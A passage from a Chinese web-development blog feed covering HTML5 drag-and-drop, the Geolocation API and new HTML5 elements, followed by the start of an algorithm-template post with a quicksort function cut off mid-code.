class="hljs-attr">id</span>=<span class="hljs-string">&quot;drag1&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img_logo.gif&quot;</span> <span class="hljs-attr">draggable</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">ondragstart</span>=<span class="hljs-string">&quot;drag(event)&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;336&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;69&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>看上去也许有些复杂，不过我们可以分别研究拖放事件的不同部分。</p><h3 id="4-1-设置元素为可拖放（draggable）"><a href="#4-1-设置元素为可拖放（draggable）" class="headerlink" title="4.1 设置元素为可拖放（draggable）"></a>4.1 设置元素为可拖放（draggable）</h3><p>为了使元素可拖动，把 draggable 属性设置为 true ：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">draggable</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-2-拖动什么（ondragstart和setData-）"><a href="#4-2-拖动什么（ondragstart和setData-）" class="headerlink" title="4.2 拖动什么（ondragstart和setData()）"></a>4.2 拖动什么（ondragstart和setData()）</h3><p>规定当元素被拖动时，会发生什么。在上面的例子中，ondragstart 属性调用了一个函数，drag(event)，它规定了被拖动的数据。</p><p>dataTransfer.setData() 方法设置被拖数据的数据类型和值：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">function drag(ev)        &#123;<br>ev.dataTransfer.setData(&quot;Text&quot;,ev.target.id);       <br>&#125;<br></code></pre></div></td></tr></table></figure><p>数据类型是 “Text”，值是可拖动元素的 id (“drag1”)。</p><h3 id="4-3-放到何处（ondragover）"><a href="#4-3-放到何处（ondragover）" class="headerlink" title="4.3 放到何处（ondragover）"></a>4.3 放到何处（ondragover）</h3><p>规定在何处放置被拖动的数据。默认地，无法将数据/元素放置到其他元素中。如果需要设置允许放置，我们必须阻止对元素的默认处理方式。<br>需要通过调用 ondragover 事件的 event.preventDefault() 方法：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">event.preventDefault()<br></code></pre></div></td></tr></table></figure><h3 id="4-4-进行放置（ondrop）"><a href="#4-4-进行放置（ondrop）" class="headerlink" title="4.4 进行放置（ondrop）"></a>4.4 进行放置（ondrop）</h3><p>当放置被拖数据时，会发生 drop 事件。<br>在上面的例子中，ondrop 属性调用了一个函数，drop(event)：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">function drop(ev)&#123;        <br>ev.preventDefault();        <br>var data=ev.dataTransfer.getData(&quot;Text&quot;);        <br>ev.target.appendChild(document.getElementById(data));        <br>&#125;<br></code></pre></div></td></tr></table></figure><p>代码解析：</p><ul><li>调用 preventDefault() 来避免浏览器对数据的默认处理（drop 事件的默认行为是以链接形式打开）。</li><li>通过 dataTransfer.getData(“Text”) 方法获得被拖的数据。该方法将返回在 setData() 方法中设置为相同类型的任何数据。</li><li>被拖数据是被拖元素的 id (“drag1”)。</li><li>把被拖元素追加到放置元素（目标元素）中。</li></ul><h2 id="5-地理位置（Geolocation）"><a href="#5-地理位置（Geolocation）" class="headerlink" title="5.地理位置（Geolocation）"></a>5.地理位置（Geolocation）</h2><p>HTML5 Geolocation（地理定位）用于定位用户的位置。Geolocation 通过请求一个位置信息，用户同意后，浏览器会返回一个包含经度和维度的位置信息！HTML5 Geolocation API 用于获得用户的地理位置。该特性可能侵犯用户的隐私，除非用户同意，否则用户位置信息是不可用的。</p><h3 id="5-1-使用地理定位"><a href="#5-1-使用地理定位" class="headerlink" title="5.1 使用地理定位"></a>5.1 使用地理定位</h3><p>使用 getCurrentPosition() 方法来获得用户的位置。</p><p>使用实例：可返回用户位置的经度和纬度:</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-keyword">var</span> x=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>);</span><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLocation</span>(<span class="hljs-params"></span>)</span></span><br>  &#123;<br>  if (navigator.geolocation)<br>    &#123;<br>    navigator.geolocation.getCurrentPosition(showPosition);<br>    &#125;<br><span class="javascript">  <span class="hljs-keyword">else</span>&#123;x.innerHTML=<span class="hljs-string">&quot;该浏览器不支持获取地理位置。&quot;</span>;&#125;</span><br>  &#125;<br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">showPosition</span>(<span class="hljs-params">position</span>)</span></span><br>  &#123;<br><span class="javascript">  x.innerHTML=<span class="hljs-string">&quot;Latitude: &quot;</span> + position.coords.latitude +</span><br><span class="javascript">  <span class="hljs-string">&quot;&lt;br&gt;Longitude: &quot;</span> + position.coords.longitude;</span><br>  &#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>代码解析：</p><ul><li>检测是否支持地理定位</li><li>如果支持，则运行 getCurrentPosition() 方法。如果不支持，则向用户显示一段消息。</li><li>如果getCurrentPosition()运行成功，则向参数showPosition中规定的函数返回一个coordinates对象</li><li>showPosition() 函数获得并显示经度和纬度</li></ul><p>上面的例子是一个非常基础的地理定位脚本，不含错误处理。</p><p><strong>提示：</strong>geolocation的位置信息来源可以包括GPS、IP地址、RFID、WIFI和蓝牙的MAC地址、以及GSM/CDMS的ID等等。</p><h3 id="5-2-处理错误和拒绝"><a href="#5-2-处理错误和拒绝" class="headerlink" title="5.2 处理错误和拒绝"></a>5.2 处理错误和拒绝</h3><p>getCurrentPosition() 方法的第二个参数用于处理错误。它规定当获取用户位置失败时运行的函数。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">function showError(error)<br>  &#123;<br>  switch(error.code)<br>    &#123;<br>    case error.PERMISSION_DENIED:<br>      x.innerHTML=&quot;用户拒绝对获取地理位置的请求。&quot;<br>      break;<br>    case error.POSITION_UNAVAILABLE:<br>      x.innerHTML=&quot;位置信息是不可用的。&quot;<br>      break;<br>    case error.TIMEOUT:<br>      x.innerHTML=&quot;请求用户地理位置超时。&quot;<br>      break;<br>    case error.UNKNOWN_ERROR:<br>      x.innerHTML=&quot;未知错误。&quot;<br>      break;<br>    &#125;<br>  &#125;<br></code></pre></div></td></tr></table></figure><p>解析：</p><ul><li>Permission denied ： 用户不允许地理定位</li><li>Position unavailable ： 无法获取当前位置</li><li>Timeout ： 操作超时</li></ul><h3 id="5-3-在地图中显示结果"><a href="#5-3-在地图中显示结果" class="headerlink" title="5.3 在地图中显示结果"></a>5.3 在地图中显示结果</h3><p>如需在地图中显示结果，您需要访问可使用经纬度的地图服务，比如谷歌地图或百度地图。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">function showPosition(position)<br>&#123;<br>var latlon=position.coords.latitude+&quot;,&quot;+position.coords.longitude;<br><br>var img_url=&quot;http://maps.googleapis.com/maps/api/staticmap?center=&quot;<br>+latlon+&quot;&amp;zoom=14&amp;size=400x300&amp;sensor=false&quot;;<br><br>document.getElementById(&quot;mapholder&quot;).innerHTML=&quot;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;&quot;+img_url+&quot;&#x27;</span>&gt;</span>&quot;;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在上例中，我们使用返回的经纬度数据在谷歌地图中显示位置（使用静态图像）。</p><h3 id="5-4-返回数据（getCurrentPosition-）"><a href="#5-4-返回数据（getCurrentPosition-）" class="headerlink" title="5.4  返回数据（getCurrentPosition() ）"></a>5.4  返回数据（getCurrentPosition() ）</h3><p>T若成功，则 getCurrentPosition() 方法返回对象。始终会返回 latitude、longitude 以及 accuracy 属性。如果可用，则会返回其他下面的属性。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">coords.latitude</td><td align="center">十进制数的纬度</td></tr><tr><td align="center">coords.longitude</td><td align="center">十进制数的经度</td></tr><tr><td align="center">coords.accuracy</td><td align="center">位置精度</td></tr><tr><td align="center">coords.altitude</td><td align="center">海拔，海平面以上以米计</td></tr><tr><td align="center">coords.altitudeAccuracy</td><td align="center">位置的海拔精度</td></tr><tr><td align="center">coords.heading</td><td align="center">方向，从正北开始以度计</td></tr><tr><td align="center">coords.speed</td><td align="center">速度，以米/每秒计</td></tr><tr><td align="center">timestamp</td><td align="center">响应的日期/时间</td></tr></tbody></table><h3 id="5-5-其他方法（Geolocation-对象）"><a href="#5-5-其他方法（Geolocation-对象）" class="headerlink" title="5.5 其他方法（Geolocation 对象）"></a>5.5 其他方法（Geolocation 对象）</h3><p>watchPosition() - 返回用户的当前位置，并继续返回用户移动时的更新位置（就像汽车上的 GPS）。</p><p>clearWatch() - 停止 watchPosition() 方法。<br>展示使用watchPosition() 方法。您需要一台精确的 GPS 设备来测试该例（比如 iPhone）：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-keyword">var</span> x=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>);</span><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLocation</span>(<span class="hljs-params"></span>)</span></span><br>  &#123;<br>  if (navigator.geolocation)<br>    &#123;<br>    navigator.geolocation.watchPosition(showPosition);<br>    &#125;<br><span class="javascript">  <span class="hljs-keyword">else</span>&#123;x.innerHTML=<span class="hljs-string">&quot;该浏览器不支持获取地理位置。&quot;</span>;&#125;</span><br>  &#125;<br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">showPosition</span>(<span class="hljs-params">position</span>)</span></span><br>  &#123;<br><span class="javascript">  x.innerHTML=<span class="hljs-string">&quot;纬度: &quot;</span> + position.coords.latitude +</span><br><span class="javascript">  <span class="hljs-string">&quot;&lt;br&gt;经度: &quot;</span> + position.coords.longitude;</span><br>  &#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-HTML5基础知识复习（一）</title>
    <link href="/2021/05/12/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/05/12/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>HTML5规范于2014年10月29日由万维网联盟正式宣布，HTML是万维网最核心的超文本标记语言。万维网不等同于互联网，但它是依靠互联网运行的服务之一，万维网又简写为www，它可以实现在互联网的帮助下，访问由许多互相链接的超文本组成的系统。现代的浏览器都支持 HTML5。HTML5 定了 8 个新的 HTML 语义（semantic）  元素。所有这些元素都是块级 元素。为了能让旧版本的浏览器正确显示这些元素，你可以设置 CSS 的 display 属性值为 block。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">header, section, footer, aside, nav, main, article, figure &#123;<br>   display: block;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>HTML5中的一些新特性：</p><blockquote><ul><li>1.用于绘画的 canvas 元素</li><li>2.用于媒介回放的 video 和 audio 元素</li><li>3.对本地离线存储的更好的支持</li><li>4.新的特殊内容元素，比如 article、footer、header、nav、section</li><li>5.新的表单控件，比如 calendar、date、time、email、url、search</li></ul></blockquote><p>HTML5的改进：</p><blockquote><ul><li>1.新元素</li><li>2新属性</li><li>3.完全支持 CSS3</li><li>4.Video 和 Audio</li><li>5.2D/3D 制图</li><li>6.本地存储</li><li>7.本地 SQL 数据</li><li>8.Web 应用</li></ul></blockquote><p>······</p><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-HTML5新元素"><a href="#1-HTML5新元素" class="headerlink" title="1.HTML5新元素"></a>1.HTML5新元素</h2><h3 id="1-1-lt-canvas-gt-元素"><a href="#1-1-lt-canvas-gt-元素" class="headerlink" title="1.1 &lt;canvas&gt;元素"></a>1.1 &lt;canvas&gt;元素</h3><p>标签定义图形，比如图表和其他图像。该标签基于 JavaScript 的绘图 API。是一个画布标签，只是作为一个图形容器，必须使用脚本来绘制图形。&lt;canvas&gt; 标签通过脚本（通常是 JavaScript）来绘制图形（比如图表和其他图像）。</p><p>&lt;canvas&gt; 标签只是图形容器，您必须使用脚本来绘制图形。</p><p>简单使用实例：显示一个红色的矩形.</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myCanvas&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="javascript"><span class="hljs-keyword">var</span> canvas=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;myCanvas&#x27;</span>);</span><br><span class="javascript"><span class="hljs-keyword">var</span> ctx=canvas.getContext(<span class="hljs-string">&#x27;2d&#x27;</span>);</span><br><span class="javascript">ctx.fillStyle=<span class="hljs-string">&#x27;#FF0000&#x27;</span>;</span><br>ctx.fillRect(0,0,80,100);<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-新多媒体元素"><a href="#1-2-新多媒体元素" class="headerlink" title="1.2 新多媒体元素"></a>1.2 新多媒体元素</h3><h4 id="1-2-1-lt-audio-gt"><a href="#1-2-1-lt-audio-gt" class="headerlink" title="1.2.1 &lt;audio&gt;"></a>1.2.1 &lt;audio&gt;</h4><p>定义音频内容。</p><p>简单使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">controls</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;horse.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/ogg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;horse.mp3&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/mpeg&quot;</span>&gt;</span><br>  您的浏览器不支持 audio 元素。<br><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-2-2-lt-video-gt"><a href="#1-2-2-lt-video-gt" class="headerlink" title="1.2.2 &lt;video&gt;"></a>1.2.2 &lt;video&gt;</h4><p>定义视频（video 或者 movie）。</p><p>简单使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/ogg&quot;</span>&gt;</span><br>您的浏览器不支持 video 标签。<br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-2-3-lt-source-gt"><a href="#1-2-3-lt-source-gt" class="headerlink" title="1.2.3 &lt;source&gt;"></a>1.2.3 &lt;source&gt;</h4><p>定义多媒体资源 &lt;video&gt; 和 &lt;audio&gt;。</p><p>简单使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">controls</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;horse.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/ogg&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;horse.mp3&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/mpeg&quot;</span>&gt;</span><br>您的浏览器不支持 audio 元素。<br><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-2-4-lt-embed-gt"><a href="#1-2-4-lt-embed-gt" class="headerlink" title="1.2.4 &lt;embed&gt;"></a>1.2.4 &lt;embed&gt;</h4><p>定义嵌入的内容，比如插件。</p><p>简单使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;helloworld.swf&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-2-5-lt-track-gt"><a href="#1-2-5-lt-track-gt" class="headerlink" title="1.2.5 &lt;track&gt;"></a>1.2.5 &lt;track&gt;</h4><p>为诸如 &lt;video&gt; 和 &lt;audio&gt; 元素之类的媒介规定外部文本轨道。</p><p>简单使用实例：带有两个字幕轨道的视频.</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;forrest_gump.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;forrest_gump.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/ogg&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">track</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;subtitles_en.vtt&quot;</span> <span class="hljs-attr">kind</span>=<span class="hljs-string">&quot;subtitles&quot;</span> <span class="hljs-attr">srclang</span>=<span class="hljs-string">&quot;en&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">label</span>=<span class="hljs-string">&quot;English&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">track</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;subtitles_no.vtt&quot;</span> <span class="hljs-attr">kind</span>=<span class="hljs-string">&quot;subtitles&quot;</span> <span class="hljs-attr">srclang</span>=<span class="hljs-string">&quot;no&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">label</span>=<span class="hljs-string">&quot;Norwegian&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-3-新表单元素"><a href="#1-3-新表单元素" class="headerlink" title="1.3 新表单元素"></a>1.3 新表单元素</h3><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;datalist&gt;</td><td align="center">定义选项列表。请与 input 元素配合使用该元素，来定义 input 可能的值。</td></tr><tr><td align="center">&lt;keygen&gt;</td><td align="center">规定用于表单的密钥对生成器字段。</td></tr><tr><td align="center">&lt;output&gt;</td><td align="center">定义不同类型的输出，比如脚本的输出。</td></tr></tbody></table><h3 id="1-4-新的语义和结构元素"><a href="#1-4-新的语义和结构元素" class="headerlink" title="1.4 新的语义和结构元素"></a>1.4 新的语义和结构元素</h3><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;article&gt;</td><td align="center">定义页面独立的内容区域。</td></tr><tr><td align="center">&lt;aside&gt;</td><td align="center">定义页面的侧边栏内容。</td></tr><tr><td align="center">&lt;bdi&gt;</td><td align="center">允许您设置一段文本，使其脱离其父元素的文本方向设置。</td></tr><tr><td align="center">&lt;command&gt;</td><td align="center">定义命令按钮，比如单选按钮、复选框或按钮</td></tr><tr><td align="center">&lt;details&gt;</td><td align="center">用于描述文档或文档某个部分的细节</td></tr><tr><td align="center">&lt;dialog&gt;</td><td align="center">定义对话框，比如提示框</td></tr><tr><td align="center">&lt;summary&gt;</td><td align="center">标签包含 details 元素的标题</td></tr><tr><td align="center">&lt;figure&gt;</td><td align="center">规定独立的流内容（图像、图表、照片、代码等等）。</td></tr><tr><td align="center">&lt;figcaption&gt;</td><td align="center">定义 <figure> 元素的标题</td></tr><tr><td align="center">&lt;footer&gt;</td><td align="center">定义 section 或 document 的页脚。</td></tr><tr><td align="center">&lt;header&gt;</td><td align="center">定义了文档的头部区域</td></tr><tr><td align="center">&lt;mark&gt;</td><td align="center">定义带有记号的文本。</td></tr><tr><td align="center">&lt;meter&gt;</td><td align="center">定义度量衡。仅用于已知最大和最小值的度量。</td></tr><tr><td align="center">&lt;nav&gt;</td><td align="center">定义导航链接的部分。</td></tr><tr><td align="center">&lt;progress&gt;</td><td align="center">定义任何类型的任务的进度。</td></tr><tr><td align="center">&lt;ruby&gt;</td><td align="center">定义 ruby 注释（中文注音或字符）。</td></tr><tr><td align="center">&lt;rt&gt;</td><td align="center">定义字符（中文注音或字符）的解释或发音。</td></tr><tr><td align="center">&lt;rp&gt;</td><td align="center">在 ruby 注释中使用，定义不支持 ruby 元素的浏览器所显示的内容。</td></tr><tr><td align="center">&lt;section&gt;</td><td align="center">定义文档中的节（section、区段）。</td></tr><tr><td align="center">&lt;time&gt;</td><td align="center">定义日期或时间。</td></tr><tr><td align="center">&lt;wbr&gt;</td><td align="center">规定在文本中的何处适合添加换行符。</td></tr></tbody></table><h3 id="1-5-已移除的元素"><a href="#1-5-已移除的元素" class="headerlink" title="1.5 已移除的元素"></a>1.5 已移除的元素</h3><ul><li>&lt;acronym&gt;</li><li>&lt;applet&gt;</li><li>&lt;basefont&gt;</li><li>&lt;big&gt;</li><li>&lt;center&gt;</li><li>&lt;dir&gt;</li><li>&lt;font&gt;</li><li>&lt;frame&gt;</li><li>&lt;frameset&gt;</li><li>&lt;noframes&gt;</li><li>&lt;strike&gt;</li><li>&lt;tt&gt;</li></ul>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-AcWing算法模板代码</title>
    <link href="/2021/05/11/ACM/ACM-AcWing%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%BB%A3%E7%A0%81/"/>
    <url>/2021/05/11/ACM/ACM-AcWing%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>记录ACM中一些算法模板代码。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="一-基础算法"><a href="#一-基础算法" class="headerlink" title="一.基础算法"></a>一.基础算法</h2><h3 id="1-1-快速排序"><a href="#1-1-快速排序" class="headerlink" title="1.1 快速排序"></a>1.1 快速排序</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> q[], <span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-keyword">int</span> i = l - <span class="hljs-number">1</span>, j = r + <span class="hljs-number">1</span>, x = q[l + r &gt;&gt; <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">while</span> (i &lt; j)<br>    &#123;<br>        <span class="hljs-keyword">do</span> i ++ ; <span class="hljs-keyword">while</span> (q[i] &lt; x);<br>        <span class="hljs-keyword">do</span> j -- ; <span class="hljs-keyword">while</span> (q[j] &gt; x);<br>        <span class="hljs-keyword">if</span> (i &lt; j) swap(q[i], q[j]);<br>    &#125;<br>    quick_sort(q, l, j), quick_sort(q, j + <span 